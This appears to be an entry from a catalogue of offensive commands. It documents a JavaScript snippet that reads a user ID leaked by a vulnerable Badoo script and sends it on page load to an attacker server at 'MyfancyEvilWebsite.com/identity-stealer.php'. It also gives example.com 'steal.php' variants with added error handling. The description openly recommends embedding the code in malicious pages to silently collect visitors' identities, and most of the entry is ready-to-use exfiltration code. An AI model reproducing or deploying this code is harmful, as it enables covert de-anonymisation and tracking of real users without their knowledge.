---
data: >-
  function UnmaskUser(str) { return str.split('=')[0]; } window.onload =
  function(){ var user = UnmaskUser(user_id); var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://MyfancyEvilWebsite.com/identity-stealer.php?victim=' +
  user , true); xhr.send(); };
tags:
  - exfiltration
  - javascript
type: command
executor: javascript
platforms:
  - Web
id: 5c3eba0f-8c99-45bd-8547-283b89c21330
created_at: '2025-12-14T17:28:52.075Z'
updated_at: '2025-12-14T17:28:52.075Z'
verified: false
validated: true
submitted: true
---
# unmask-user-and-exfil-js

## Command

```javascript
function UnmaskUser(str) { return str.split('=')[0]; } window.onload = function(){ var user = UnmaskUser(user_id); var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://MyfancyEvilWebsite.com/identity-stealer.php?victim=' + user , true); xhr.send(); };
```

## Description

This JavaScript code defines a function to extract the user ID from a string format in the global user_id variable (populated by the vulnerable script) and sends it to an attacker server via GET request on page load. Use in malicious webpages to silently collect Badoo user IDs from visitors.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| str | Input string from user_id variable (e.g., '12345=...') | Yes |
| url | Endpoint for exfiltration (e.g., 'http://MyfancyEvilWebsite.com/identity-stealer.php?victim=') | Yes |
| user | Parsed user ID value | Derived |

## Examples

### Basic Usage

Embed in HTML after loading the vulnerable script:

```javascript
function UnmaskUser(str) { return str.split('=')[0]; } window.onload = function(){ var user = UnmaskUser(user_id); var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://example.com/steal.php?victim=' + user , true); xhr.send(); };
```

### Advanced Usage

Add error handling:

```javascript
function UnmaskUser(str) { try { return str.split('=')[0]; } catch(e) { return null; } } window.onload = function(){ if (typeof user_id !== 'undefined') { var user = UnmaskUser(user_id); if (user) { var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://example.com/steal.php?victim=' + user , true); xhr.send(); } } };
```

## Expected Output

Silent execution: Browser sends a GET request to the specified URL with the victim=USERID parameter. No console output unless errors occur; check network tab for request confirmation.

## Related

- [[Related Procedure: Extract-and-Exfiltrate-User-ID]]
